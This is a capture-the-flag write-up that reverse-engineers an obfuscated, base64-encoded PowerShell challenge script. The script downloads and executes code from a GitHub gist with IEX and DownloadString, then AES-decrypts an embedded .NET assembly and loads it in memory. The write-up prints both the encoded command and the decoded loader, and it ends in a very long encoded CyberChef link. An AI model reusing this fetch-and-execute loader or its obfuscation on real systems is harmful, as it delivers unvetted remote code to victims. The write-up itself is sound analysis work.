# pwsh

[library.m0unt41n.ch/challenges/pwsh](https://library.m0unt41n.ch/challenges/pwsh) ![](../../resources/re.svg) ![](../../resources/medium.svg) 

# TL;DR

We get

*   **Encrypted flag** (80 bytes, as a 160-character hex file):

    ```
    C27453D6EF9D22C34460D6AB62CE7D8760F535941E29CF7125B8A2DAB8AD941CC277363F1C0F80BD73BA7963A37F3AA2D7AC4B1979C817E4BCF1E4BD2344AB399CEB3D730F7223A9901312199D7E2727
    ```
*   **A command** used to encrypt it:

    ```
    pwsh -enc JAB6AEgAYQA0AGUASwBjAG0AIAA9ACAAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBIAGUAeABTAHQAcgBpAG4AZwAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AQwByAHkAcAB0AG8AZwByAGEAcABoAHkALgBTAEgAQQAyADUANgBNAGEAbgBhAGcAZQBkACkALgBDAG8AbQBwAHUAdABlAEgAYQBzAGgAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAQgB5AHQAZQBzACgAKABHAGUAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAEkAZAAgACQAUABJAEQAKQAuAEMAbwBtAG0AYQBuAGQATABpAG4AZQAuAFMAcABsAGkAdAAoACIAIAAiACkAWwAyAF0AKQApACkACgBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHMAdAAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ATgBvAFIAZQBsAGUAYwB0AC8AYQBkADcAMQBjADQANAA2AGQANAAxADMAYwAzAGQAZQBiADIANAA2ADgAOQA5AGQAYgBhADcANgBhADcAMAA1AC8AcgBhAHcAIgApADsAIAAkAHMAYwBRAEEAcABHAEsAWQAgAD0AIAAkAHIAWQBFAGIAYwBrADkAUAA7ACAAJABzAGMAUQBBAHAARwBLAFkALgBsAE4AOABlAHUAYQBpAE4AIAA9ACAAJAB6AEgAYQA0AGUASwBjAG0AIAA7ACAAJABBAEgAbwBqAGMAWAB0AGwAIAA9ACAAJABzAGMAUQBBAHAARwBLAFkACgAkAEEASABvAGoAYwBYAHQAbAAuAG8AcABTAHcANwBFAFgAUQAoACkA
    ```

# Powershell part 1

First of all, I learned that this is actually a valid invocation of Powershell &#128578; And, that Base64 string
[decodes](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=SkFCNkFFZ0FZUUEwQUdVQVN3QmpBRzBBSUFBOUFDQUFXd0JEQUc4QWJnQjJBR1VBY2dCMEFGMEFPZ0E2QUZRQWJ3QklBR1VBZUFCVEFIUUFjZ0JwQUc0QVp3QW9BQ2dBYmdCbEFIY0FMUUJ2QUdJQWFnQmxBR01BZEFBZ0FGTUFlUUJ6QUhRQVpRQnRBQzRBVXdCbEFHTUFkUUJ5QUdrQWRBQjVBQzRBUXdCeUFIa0FjQUIwQUc4QVp3QnlBR0UKQWNBQm9BSGtBTGdCVEFFZ0FRUUF5QURVQU5nQk5BR0VBYmdCaEFHY0FaUUJrQUNrQUxnQkRBRzhBYlFCd0FIVUFkQUJsQUVnQVlRQnpBR2dBS0FCYkFGTUFlUUJ6QUhRQVpRQnRBQzRBVkFCbEFIZ0FkQUF1QUVVQWJnQmpBRzhBWkFCcEFHNEFad0JkQURvQU9nQlZBRlFBUmdBNEFDNEFSd0JsQUhRQVFnQjVBSFFBWlFCekFDZ0FLQUJIQUdVQWRBQXRBRkFBY2dCdkFHTUFaUUJ6QUhNQUlBQXRBRWtBWkFBZ0FDUUFVQUJKQUVRQUtRQXVBRU1BYndCdEFHMEFZUUJ1QUdRQVRBQnBBRzRBWlFBdUFGTUFjQUJzQUdrQWRBQW9BQ0lBSUFBaUFDa0FXd0F5QUYwQUtRQXBBQ2tBQ2dCSkFFVUFXQUFnQUNnQVRnQmxBSGNBTFFCUEFHSUFhZ0JsQUdNQWRBQWdBRk1BZVFCekFIUUFaUUJ0QUM0QVRnQmxBSFFBTGdCWEFHVUFZZ0JEQUd3QWFRQmxBRzRBZEFBcEFDNEFSQUJ2QUhjQWJnQnNBRzhBWVFCa0FGTUFkQUJ5QUdrQWJnQm5BQ2dBSWdCb0FIUUFkQUJ3QUhNQU9nQXZBQzhBWndCcEFITUFkQUF1QUdjQWFRQjBBR2dBZFFCaUFIVUFjd0JsQUhJQVl3QnZBRzRBZEFCbEFHNEFkQUF1QUdNQWJ3QnRBQzhBVGdCdkFGSUFaUUJzQUdVQVl3QjBBQzhBWVFCa0FEY0FNUUJqQURRQU5BQTJBR1FBTkFBeEFETUFZd0F6QUdRQVpRQmlBRElBTkFBMkFEZ0FPUUE1QUdRQVlnQmhBRGNBTmdCaEFEY0FNQUExQUM4QWNnQmhBSGNBSWdBcEFEc0FJQUFrQUhNQVl3QlJBRUVBY0FCSEFFc0FXUUFnQUQwQUlBQWtBSElBV1FCRkFHSUFZd0JyQURrQVVBQTdBQ0FBSkFCekFHTUFVUUJCQUhBQVJ3QkxBRmtBTGdCc0FFNEFPQUJsQUhVQVlRQnBBRTRBSUFBOUFDQUFKQUI2QUVnQVlRQTBBR1VBU3dCakFHMEFJQUE3QUNBQUpBQkJBRWdBYndCcUFHTUFXQUIwQUd3QUlBQTlBQ0FBSkFCekFHTUFVUUJCQUhBQVJ3QkxBRmtBQ2dBa0FFRUFTQUJ2QUdvQVl3QllBSFFBYkFBdUFHOEFjQUJUQUhjQU53QkZBRmdBVVFBb0FDa0E&oenc=1200)
to Powershell indeed:

```powershell
$zHa4eKcm = [Convert]::ToHexString((new-object System.Security.Cryptography.SHA256Managed).ComputeHash([System.Text.Encoding]::UTF8.GetBytes((Get-Process -Id $PID).CommandLine.Split(" ")[2])))
IEX (New-Object System.Net.WebClient).DownloadString("https://gist.githubusercontent.com/NoRelect/ad71c446d413c3deb246899dba76a705/raw"); $scQApGKY = $rYEbck9P; $scQApGKY.lN8euaiN = $zHa4eKcm ; $AHojcXtl = $scQApGKY
$AHojcXtl.opSw7EXQ()
```
What this does:

*   Calculate SHA256 of the argument
*   Load another Powershell from the internet and execute it with `IEX`
*   Use `$rYEbck9P` object (presumably created by above script), set `lN8euaiN` field to above SHA256
    and call `opSw7EXQ()` method.

Let's write down that SHA256 (`f18355c3ac13610245ce264ba7edaba767e8ab08ddb1c856c31b687f7d6dacf1`),
it will be useful later.

# Powershell part 2

The contents of the remote file:

```powershell
$oXJ2qp6U = @"
#nullable enable
using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

namespace g3zJyAFg
{
  public class g7syFFmE
  {
    private string KqGzU08u = Encoding.UTF8.GetString(Convert.FromBase64String("ZXVhaU4="));
    public string lN8euaiN = "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08";
    public string l3RklVko = "35d92bb1776d267fd61d2cfc5bcb3398";
    public byte[] ZFyxH1q9 = new byte[] { 0x3c, 0x5, 0x5a, (..............), 0xf2, 0x4f, 0x7 };
    public void opSw7EXQ() {
      var tJ1NrxdN = (string?)typeof(g7syFFmE).GetField("lN"+8+KqGzU08u)?.GetValue(this);
      byte[] Wplul9cc;
      using var C4TsfjkW = new MemoryStream(ZFyxH1q9);
      using Aes MhIij16n = Aes.Create();
      MhIij16n.Key = Convert.FromHexString(tJ1NrxdN ?? "1b4f0e9851971998e732078544c96b36c3d01cedf7caa332359d6f1d83567014");
      MhIij16n.IV = Convert.FromHexString(l3RklVko);

      using CryptoStream Lsij2utc = new(C4TsfjkW, MhIij16n.CreateDecryptor(), CryptoStreamMode.Read);
      using MemoryStream EXWzzvhO = new();
      Lsij2utc.CopyTo(EXWzzvhO);
      Wplul9cc = EXWzzvhO.ToArray();
      var JgbHsHpL = Assembly.Load(Wplul9cc);
      JgbHsHpL.GetType("FlagCryptor.Program")?.GetMethod("Exit")?.Invoke(null, new object[] { 0 });
    }
  }
}
"@
Add-Type -TypeDefinition $oXJ2qp6U
$rYEbck9P = New-Object g3zJyAFg.g7syFFmE
```

Note the very long byte array (trimmed here). Looks like embedded C#, which creates a `$oXJ2qp6U` type and
instantiates an object of its class (`g3zJyAFg.g7syFFmE`) as `$rYEbck9P`. Note that we saw `$rYEbck9P`,
`opSw7EXQ` and `lN8euaiN` before, in the top-level script.

Let's rewrite all this for readability a bit:

## Script 1

```powershell
$sha256 = [Convert]::ToHexString(
  (new-object System.Security.Cryptography.SHA256Managed).ComputeHash(
    [System.Text.Encoding]::UTF8.GetBytes((Get-Process -Id $PID).CommandLine.Split(" ")[2])
  )
)
IEX (New-Object System.Net.WebClient).DownloadString(
  "https://gist.githubusercontent.com/NoRelect/ad71c446d413c3deb246899dba76a705/raw"
);
$obj1 = $obj0;
$obj1.sha256 = $sha256 ;
$obj2 = $obj1
$obj2.myMethod()
```
## Script 2

Note that:

*   `KqGzU08u` is just Base64-encoded `euaiN` and its only purpose is to obfuscate
    the `GetField`. We're simplifying that and renaming that field to `sha256`,
    both here and above.
*   `l3RklVko` is a fixed string
*   There are a couple of SHA256 sums competing for our attention - but, as long
    as we actually set it from the outside (which we do, above), it's the only
    one that will matter.

```powershell
$typeDev = @"
#nullable enable
using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

namespace myNamespace {
  public class myClass   {    
    public string sha256;
    public byte[] asmBytes = new byte[] { 0x3c, 0x5, 0x5a, (..............), 0xf2, 0x4f, 0x7 };
    public void myMethod() {      
      using Aes aes = Aes.Create();
      aes.Key = Convert.FromHexString(this.sha256);
      aes.IV = Convert.FromHexString("35d92bb1776d267fd61d2cfc5bcb3398");

      using var asmMemStream = new MemoryStream(asmBytes);
      using CryptoStream asmCryptoStream = new(asmMemStream, aes.CreateDecryptor(), CryptoStreamMode.Read);
      using MemoryStream asmMemStream2 = new();
      asmCryptoStream.CopyTo(asmMemStream2);
      byte[] asmByteArr = asmMemStream2.ToArray();
      var asm = Assembly.Load(asmByteArr);
      asm.GetType("FlagCryptor.Program")?.GetMethod("Exit")?.Invoke(null, new object[] { 0 });
    }
  }
}
"@
Add-Type -TypeDefinition $typeDef
$obj0 = New-Object myNamespace.myClass
```

With the `sha256` set by outer script, calling `myMethod()` will:

*   Create `Aes` object with a fixed IV and key set to SHA256 of the input string (i.e. encoded inner script).
*   Decrypt the byte array into an executable object.
*   Create assembly out of it and call `FlagCryptor.Program.Exit()` on it.

We now have all the data to decrypt that executable ourselves:

*   Encrypted data (`asmBytes`)
*   Key: `f18355c3ac13610245ce264ba7edaba767e8ab08ddb1c856c31b687f7d6dacf1` (in hex)
*   IV: `35d92bb1776d267fd61d2cfc5bcb3398` (in hex)

Unsurprisingly, this decrypts as something that starts with `MZ` &#128578;
([CodeChef link](https://gchq.github.io/CyberChef/#recipe=AES_Decrypt(%7B'option':'Hex','string':'f18355c3ac13610245ce264ba7edaba767e8ab08ddb1c856c31b687f7d6dacf1'%7D,%7B'option':'Hex','string':'35d92bb1776d267fd61d2cfc5bcb3398'%7D,'CBC/NoPadding','Hex','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=M2MwNTVhZDlmMzY5NDU0M2FhNjlkZWQxNThjMzg2ZjU1Yzg5MzdkZjllMWYxY2MyMjJhMzU0ZmU4MTNhYmQ3NjE0MzcwMTFhODc2YjNlN2Y2ZmVlMTE5MjFhOGFiZTVhZTQ5MWVkMTc1NjIwN2MwYzRkNGQwZjE2NGVjNmUyODRkNTcwYTdmNjRiYzU4MjBiMjczYTgxOWE3MDNlOGJhNWY5Mzc4NDlhOGVlOWViNTM2Nzk1M2Y2NDA2YjgzNGNjOTk2MWRjZDJlODI1N2ViYjBhNzRhZTA5OWJlOGNmZGQ3ZmExNjUxMDVkNDJlYTIxOWFmNjU1MGQxYzM0ODA3YjVkYWEyZGViYTY2MWQ1OGU5NzkzYjYzYjVkNmVjMzI0YTZhNjdlNDcxODU2NThjNDkyMTQ1NmVmNTVhY2NjODRiYzk5YWNjNmFkMzcxNzYxYzdjZDE4MGM4YWMzODI3M2U1MWQxYzM5MDcyNGM5YzAyMGRlNjM3YjM5NmI3Y2Q5OWVjOWNkOGUwZjgwOWZjZTUwNDFlOTFhYmZiOTQwOWQ4ZDA5MDRhYWQwNDU3YjVhYmVlZDUzYTZjN2MwOTgyMWViY2FmZjgzNzY3MTQ1MDQzMWM2MDkyYmRmYTVjNDI3OWNmNGE5MmYxMjFmN2QzZDk0M2I5MjM1YTFkZjVlMTUwYjNjN2FlNjE2MmEwNTJmODU2NTVlYTdmNDU4NDI0ZDQ3YzQ4ZDQ2MTY1NzU5ZjI4ZDdhMjkzOTlmOWFlNDkxZjk5YTE1YjQ5MWViNzIzMTg4Y2RiYzdiMDE1ZmNjMmVkYWY2MTFiNzM5ZjNkZTQ5MjdkZmUxNDZkMzc5MjcyZDMwZGJjNjA4MjE3MjcyMTA2MmNlYTA4NzBhNWU1NWI1ZGVjNGU1NDEyNTViZmM4NjM4MTIwODI0YWNmOTdjMzBjNmI3Mjk2MzNiNTU1NWExZGZkYmY5ZjRjNmFmYjNiZGVkOWZmYjRmMWRmOTFlODA1MzhkZDNjNTlhNTg4YWFkYThkNmJjNWJlMDJjYWU2Y2MwZWRiY2ZhOTFjNTM4NzM5MTIwMmFkMjlmOWQ3MTlmODEwOWRkODQ0NDU0NDFlZWFlNDNhMTMxYWRhOGNiNjI0OTY2NDUyMmUyYjNkMjk0ZDExYjdkNzcyMWFlZGRiYWVmMTg0MWIxNTI5OThmZDY5N2YxM2RkMjM5Y2I3NmMwYWZjOGMzM2ZhZDU5NGRmYjliZGEyNGE1MDU1NzU4ZTgzN2VmYjJiODM0YzZkZTI5MDcxNzM5NjJmMjUyMWVjYmEzMGQxY2NiMTY1ZjEyZGM0ZDMzOWMyMzNkZWNlYWE3MWE3ZjE2ZDk4NDMxM2IxNzRmYWJjNGU2OTA0YjExZjI2ZGI5OTRkMzIxYzAwMjdmMmQyNWMxZGQ2YjU4ODJkNWUxZmNjYzdiOWYwOTk3NzgyZTEwNjk0ZTVmOGVlZGYyZjJlYTI2YmYwMDQ3MmFkMTA2NTFmOTY1ZDZkNTRhMTU4N2ZlN2I0ZjdjMzI2ZWJkMzA2NGRhYjJkZTYzNDkzYjFiM2IxOTIwOTE2OTg0N2FhZGRmY2MxMmZmYjY0OWNiZTAzYmE2ZTIwMzMyM2Y0N2Y0MTFhODFjMzRmYWU4ZjEzYjljYzY2MWU1N2E3NjE3NmMwOWM0MDFiMTQwZGE1NWU4NjAzYjIwZGI3ZTFjNmU5NTM5ZWQ1Y2U4NzAxN2Q4ZjJiYjBiNjFmZjA0ZDQxM2ZiNTc1MTg4M2FjNmQ0YzlhODY1MmExMDc3YjA5NWNlN2QxNjEyYWEwZWUyNTZiMjE4NjRlYjhhN2FhZWIxNWU3MmFlOWViZmVmODQzY2FiOGFmOWExMWRkMTA2ZmJmMGQ0MWYxM2IxNjA5ZTc4ZTYzYzc4MjRiMjgzNjBkNDRlNzgzZjVhOGNmOTIzNTUyY2VjMzczNjIzN2EyZmI4N2E3ODNhMTBiZDVmNGRiOTA2MGRjZWE3MTg5OTJjODczZjE2MDdiYWM1ZWM4ZDIxZTZkOTQ2NmMzY2NlY2VmMTQzODIzOTM5YjhmMWRkMDQxZjRiNDc4NzgyZWZhN2M0M2IzNmE0OTcxNWZmMTg2NjQxOTQ3NmMwMzFhMGUyZDc3OWQ2OWQ4NzM3ZDQzMmI3NWFiM2RiZDkzOTBjZjE2MWFiOTE1ZDAxZWIwNTVhYzU2MjdlZDhhZmRlOTRiYjZjMGIzOGFiMTFjMTRmOGYwYmY1NWQ5OWM4ZmVjMDg1YTQ2OWM0ZGNmMDQ5YWRiMTEzYWFkY2FiOTM2YzRkNmQ2NjQ0MzJhNWU1MzBmZjI0YTk2NjdjY2U3NTkyY2UwNTJlMmVhNmNhM2Y0ZDIyM2ViNjkxMmQwNzE4MzYzOGZiYWE3ZTRjNjI4YWZmNmU2OTVjMGRlNzZjYzNhYWM5ZjBmMjcwNjQwNTEwNGQzNGMwOWRhYTcwOTE3NDUwZDM0YjQwYjUxNjRlNzFiY2QzYTM4MjA4MDQzMDlkMWJhMWZlOGY2YmEwYmI5NWZiNzEyYTIyMWZlNTQ1ZTBhMmU4NDdhYTY4NzUwNDg3YzA3NWY0Yzc5OWQ5NjE0NDNiZDc3ZmVkYWYxMjE0ZDNjYzg2M2ZkYWRkM2VkM2M5YzI0ZGUxNjZmNzA4NzNmZjk4NTI1NzZiYTQ5YjA4ZjgyY2I1YjBkYjBkZDQyOWUzYTRmZmNlOGJmNzQ5N2NiZDFmNDhmNDVhMzgyNzEwYTk5NjZhNGIzZThhOWIwNWYyYmE4MTlhMjNjM2Y5ZWYyMWVlZDU3NGQ3ZDU2ZTJjY2ZhYTMxYjA0ZTViYzc2OTRjYzNjNDYwZDVmZTE5YTUwOTJiZTQzYjFhNzZmZGY1Mjg0OGIzODE5NzRmZDM0Nzk2ZGJkNjNhNDg0MTQ3NmNkYTI2OGIzMDlhZjMyNTgwZjM1ZTJmMTg2ZDdjODQwYjZkNjQ3MWE3MjQyNzU5Y2MxYjFhNTlkMmUwNTI4N2I1OGJiNjRmNTMyOTE5NWNmYWQ4MGI4ODZiOWQxOGYzMTg4MzBjYjE0MzM0MmY4ODQ1NzE0OTExMTkzZWY0OTAxNjY5NDA3YmQ5NThmNmM4YjcyODE3MDYxYTE2NjgxMTE2YTYxZTI4MmI1ZmY1MzdlMzNhMWNlNzk1YzY2MWQxMmVkMTJkYTcyZGMxODYyNDQzMmEwMDcwMjBkNzNlOWY2ZTM1YjIzNjQ1NjQ0ZDQ3YTc0YzMyZDUwMjMzMmZjMzdkNTEwNTYxZWRiMzI0OTg4NjcxZWJlOTM1YjMyMWQyYjcwNTA4ODlhMWE4MTU0NmUyNWM1NzBmOTk1NTA1YmUzNDhlYjE2ZGU1NTU2Nzg2ZTgzY2NiZTI0NDg3YzA1ZTNhNjEzMDRlZThlMDQ0YjVmYjRjZDFmMzBmMWQyZmYzZDhiNzEwY2M3YWNmOTI0ZDk4M2E1OGY0OTc5NjljOGNlNGM5NTQyYWU3YzJjNjFlZjE2MDZmM2FmOThkNjUwOGIzZTZlOWVkZGE0OWYyNzg4ZGJlYzM5ZDEwMjAwMDUzMDdmZTY4OGFiZmM5YzU5N2QwN2NlODdjNjhmMjJjMjA2ZDkwOTg0NzBmYzgyNGIwZTc3NDE5NzY3ZDc3ZjkyNGZmNzEyYjAzNjc2MzRmMjM2MWE3ZjBiNjBiZjA1OTM5NDk2YjlmNjliMWU1OTY2ZmNjN2Q3NTViYzBjNDk3ODI2OTUzNDFjYzg1YTUwYTQ5ZWI4MmY2YTM3ZDMyZjFjMGNmZjExMzRkMDhhMjc4NDhlZjkyNDlmOTk2M2U0ZDk1N2M0N2JhNTFjMzQxN2Q5NDFhZGUyYzdiMjc4NGVlYmY1YTlhMmY3M2QwNmE2YWZkNzZiN2YxMGU3ODBmZmIxY2JjZTE1MjkzZmZmNWVhZjY2NzEyMWNmMTg5ODQ1YjUxODdlNDg0YmQ0YjhmMGM5OTY4Y2VlZDgwZjM4ZDQxNDgwNWMwMzJjNDEwZWRiNTMyZTVhNmU1YzBkNjlmZTE4MTQxYTYwZWZlZTE4M2I4ZDY1OTU4NzNlNTA1MGZiNWIyNDZhMWRjNzQ3ZGExYmRiYWFhNGU4NzA4NjM1YjA5MTM1ZDY1ZWYzNzZmMGE1YjMxMjUzNmIyYmFjMjA1MzYyNjk4YTZhNTM3ZDU5NGU4NDBlY2Y0N2MzMjYwZjAzN2RmMTBjMDg4NzljMTY4OGUyYzIwNmVlNGQ0ZTFmNTMxNWZhMWNjN2YxY2I2ZTgxNDcxZGE2MGNmN2E2ZDY4YWJiZDJhNmUzMzg0ZjIzNTZlOTYxMTU2NGMwODA2ZTNkZTlmMzY0NzUxY2EwNDZiY2Y2NzA0ZDAxYjE2ZTdmZjlhNTdiMGYyNDVkNWExZTFmOTM2NmVkN2NlNGM1ZTRmMjZmMDVlYzIxYjI5ZWUxZTMzZDYxNTQwMzA3ZmNiY2JiZjg2NTZmNmQ2NTc0Mjg3MTUyOGQ0Y2U5OWMwYTAzN2U5YTg5NTcxNmU3M2QzYTdmYzY4Mjk0YzkzZDhmMGE4MGViMzg3ZWFiNGQzNTMwODMyYjVmMDI1YzI2NWYyNDA2YmRlMjhhNjgwZTIxMjBlNjI2YzIzY2I0N2Q2YjUyOWJiZGZjYjg0ZmNkNmMxOWE3YzRlMzJjMTcxMWE3ZGZkYTMyMzE3ZjQ0ZTYzZGJlYzkyODhiOWYyOTY1MjQ3OTc0YjhjNjVkZjJkYjNjM2VhMTRhODk4NzI5M2Y5MjkyOTBlMGFhZmI0ZGJlZDdiYWQ4MTA1NDE2ZjAwMDAzYWVkMDkxNmYxNDQxZmZlZDM1MmJmZmY0NTIzZWZlNWFkOTI4ZTk1ZDMxYTc5OWE0N2I1NDk4MjUxZTljZjczNzMwMmM2ODQwZmVlZjIxZTNhM2JiN2EzZTE3M2FjMDE3NTM1NDcwMTI1ZjhlZjUzZGIwNWRiYjEwODJiZTQyOWViZDg4NjQ1MWMxZmJjZDk4NGE0ZDVjMjA4ZDI2Y2JhZmM4Y2RmZWE3M2VkZDkwN2U2ZGU1MTllOWU3NTUwODI5OGZmMGUxYmM0ZmZkNDVmNWNmYmI2ZDkwZDU3YzRkZGMzYTdlM2E4ZjBkNTU3N2ZhOWY1NTNmM2U5NThlMWM4YWYzOTk4YWU2M2VjYTMxZTA0Y2ExNzU2ZDVjMTYzNDBkNzg1MjIwODE0NDVkNGVjMjJkNzlhNzc2MDgyOWMxNjg1YmQwMzIyNzgzZjE0OWU3NmE1MDNlNzBlODQ3OGNhYWUwNDcyNzhkZWM1N2QzN2FlOWNhYzJkYzk0OTVhOWJjNTEzNTFlMjE0YmFhMzQyNmQ3ZjM2MGJhMTY3ZDFhMTJkN2RlZWU4MWUxODA5YjM2MTBkNGZiMDBmYzc1YWZlNDVkYmJmMjljZDVmZjE1N2JiNjIyZjI4MWFlYzdkMjg5NjhmNzk1MjA3ZGY0NGUwOGI2NzljOThiMTEwNDJmNzgxNjE3MDE1NDRkYTQyZmE2YjQ0NWVlMmYzZWRmM2Q0ODgyOWM5MDg4MDJlMGUyYWRlYTdmM2ZjYWNkOTZlODgzNjA2ZDczZDgyNTRlY2Y3NWNiYWQ1NWM2M2Q0YmU0MjkxMzhkYzYwOGNiZTdlZWRmZTcwMDc3OTFmYjM0MzI1NjE4ZmY2ZmUxZDk4MTk1MjRlYzY4ZjBjZTNkMTc0OTg4MTg2YjllZTkzYzI3ZjI1NzVjNGE3YmI5YWNiYzZkOGU4NWNjYmMzYTcyMDI5ZGQ5MGJiYjNiMDMzMTk0ZGViYjc3MWM5YTgxZGU5N2I5N2MyMmFmMzhiMzJlYmMyZmFjMTdmNmNlOTZjM2Q2MWFlZThiMGFjMmFjMzc0ODI1MmZlNjU4MmFhYTkyZTA4YjM2N2IyM2QyNTk2OGU1ZDA3M2NkYmFjNjY3MTc3NDA5YTg1MTc4ODhlMDJiODYxN2E4YjI0NzFkZjYyMmE2MDZmNTUxZDIwNDA3Yjk2ZjA3Nzg4YWZjZjYzOTc3NzZlOTk4YTQ4NzBmMjE0YTY5M2FhZmZmYjZlYjU0ZjdiNGZhNjY4NmU3Mzc0NjBiODVkOGJjNzk5M2JkNWUzNjE3NjFlYTcyZDM3YzVmNTBlZjg5MDBmNDZmYzc3YTBlYWFmZDAxYmI5ZTUyOGY5MTU1Zjg1ZTg3MTRjMzFkYTFmNGJlYmZhYjlmZDExZTUwMDgzNWY0MTk5MzliMDQwODg4NWVhZWM4NWM3MmZmODg3YTEzMjMxZjdmYjZiODg2YjJiZjZiYzAzOWYwNDkzNjZkYTk4MGJkZDA2MmQ0ZDg0ZWFhYjY4NTk5YzEyYWE4MjE4MDkxYjRlY2I1OGNhMjUxZjAwM2U1MDZiMzdhM2I2ZDViYjQ4MDA1MTllMjc4NjU5YTJjM2M5OTg1ZmU3YzA4NzBlYjc2NmI0NWQ3ZDYxZDY5NzQyMGVjMDJlOTJlOWQzMDNlMWZjMDdlMmE3YmVjNjc0NDg3YWEyYzkzZDY3NGRhMWMwOGIyMmI1NGQxYTFmMWRjZGZmYWJiOGZkMTZmYTRhMTM1YTIzNGE1OThjODg2OWU3Y2RkNmYzMTIwMWY0N2IxNzMwNWYzNWIxNTU2MDkzMDVlMjcyMGM3NWJkODZjMGI1ZThlMDg3YmFiZDc3ODg4N2MyZDJhZWM0ZTQ4YzY2ODAwNzM5YjhiZDBiZTY3OWNhMzE0MGE0MzRlNDcyZjVjMDhjOTdmODE1MTgwZDQ4MGQ3NTQzMGMwMjUyYjQwOTc0ZmE5NGRjMjNmZDhjNDI5YjU0MmM5YWI1ZGMxNTBiYzVmNWYwYTlhOGQ1N2NkMWY5Y2QyOTU0ZjE1ODU5NDNmNmY5MjBmMDM4OGIxOWRlNWI5YWM2OWI3YjczYjc2NGYyMTMxNzVjMjE0ZTI1MzIwN2UzZmY1MmQzN2QzYzZkYzJiMDIwYjI5ZWQ4ZWQ0MWQ4Yjc4YzEyM2M3MTkxNjYzZmRmYzFjNzZmMTEzOGU0YWE4NzcxZGUxYTc4NzNkMzhmYzI0ZDgwYzU3NjI4MDgxNTNjYjg4MWVlMzRiZTNiM2NhNmY2ZDE5YTdjNDNhZDdkM2RlZmJhZTc0MjAyZDNkNTdjZTM1OTM2M2E2NGYyZGM5MzZkYzlkY2Q5MTM0ZjYzOWZmNjAzZDliNWFiZjUxMDMwOGIzZmQ0YjU2MjkxMmQ2N2UxZTkwNzg2NDhiYjM3YTNhMWNkNThjZTBlZTRiMjUyOTBkZmExYjMzMGEyNDMwMDEyYjU1YTI1NzZjMzgxZjg5NzQyZmIxMTk4MDM3M2I5MWMxNzljNTU0ZGY4YTdmZjgzNmUwZmFjMjJjYzVhMDA0NWI1MDAyNTBiZGM3ZjY0YmJiYWU0OTIwMThkMWUyMzdhNzI1NWY5YzI3MDk2NDMzYTVlZmE3NTQ2ZmRjOTA0Mjg1YjBhYzFjYzgxYjkwOGEwNzNmNDBmOGM3YTdkZDkyNDMxN2VjOGRlNjg3MjQ4MmZlZGI3ZDdkN2YwMjdiZWZkNjI4NWQ4ZjFkMjI3NWU4ZGRkMDE5ODI5ZmE1OTA0NGM1YzU3Mzg1NDdiMmE0NjY4MzQ1NGUzMzE2MjIyMTc3MTM0MzlkYzBlYTRkNzhiZWRhM2JlNDZkZTNjZTYwNWY3YWFhM2Q4YTg4YzA0OWE5YjFiY2VkODBkNzVhZjUxZGMyMzQ5NmFhZTFhOWJiNzE5YmI4NDFlMGU3MWVhMDhjNjQwOWYzMGY3Y2ZmNGE5ZmQxOWFhZjBjNTVkYjBmYjc0NTNlMDBiNjEwN2EwZmUyOGFlMzc2YTU0Mjc3NTdkOWZjMzM2MmNlOGU2MDk5MzdlYTlhOGRhYjU3MDhjNzU2Njg3NjM0YjYzYzliODRkMzBhYjM2ZTQzOWI2N2FhMmY3NzUxM2Y4OGEyZjc0MWI2YTViOGQxMjdkNzllZjI4NjA1ZWYxZmZlZTg5ZGI4MTIzYzM5NTIzMGQyYmUyOGRhOTkwYmQ0OWNmMDUzZWZkYzUwOWJlZTA4MmE2ZTkxOWY1MDlmYWZmMzNhNGRkMWFmZTg3ZDVhYzBkYWEzMTMxODkxYzEzNzNlN2ZlYWJlYTliYmFhMGRiNGMyYWFkZjJhOWM5ODFkOTZmM2YwODVkNWRmZWFjMDk5NjYyMGJhNjczZGE0OGM2ODg4YmZmZmQ2ODBiZGNiOWE5MzIxYmIxYTE0MzM0YjFmZmM1NjE0NGUzNmVkMDUyMmNhOGNjODUyMjg5NTk0YjAwYWQ1ZjU1OTkxOGJjOWQ0YTZiYzA3ZjUwMWJmZTI3MDExOTQwMGZiMzNmY2I5Y2I1ZGRhYzIxNzE1MDdhZDljODUyMjExYmE0MzFhNThmMjRmNWM3YTY4M2E1ZDRhYjRmZDEwNjQ3ODIwYjAwZjYwNWY0MDRkZWJkMmEyOTcwM2Y4ZDlhOTMwYjBiODhiYTM3YThiODcwY2U4M2I4NjJiNTBhNjNiNzhkZjFlMGVjMGRmMTAzMjU1NjEyOGFkNWUwOGM2ZTUwZTcwNzNkM2VjN2JjYTgyZmM2NzQ2NWM4ZTVlYTRiNTg1OWNiYzRhZWM2OWZkODRjZDk1ODNmNWJlMzc2MmE2YTM4NWUzNWVlMzc0ZGI3YzE4NDM1MTNmNGEwNTdkNGFlZjcwZGRlNGU3ODBiZWZlZTc1MDNiOGFhNjFmNGMwNDk5OTRhYjYyMDA0NGU0YzQ0ZGE0N2Y2NjViZGYzNjExZDhjMDY0NjQ3ODRiZTljNWM5NTA4MjIyYjQ2MmYwNzBjODI2NjAyMTY3MWM3YWJlNmViOTdhY2M5NTZhZGY1ZjQ2MTg5YmIzZjI1N2I2MDQzMDg5ZGFlYmFlMzA4NGNkYzM5MDkxMDZhMzM2ZTQyMmUzNGNmOTFiMzQ2MDBkM2MwYzMyYmM5MjM0ZjhjZDIzM2U2NDU3ZmUxYjU0NTIwYzVhZWFhMGUwZjU3M2U3MDVhODIwNzU4OWFkNjYyZWFkN2ZjMWQ5MWYxMWM3YzczYTAzNGVlOTQwYzE4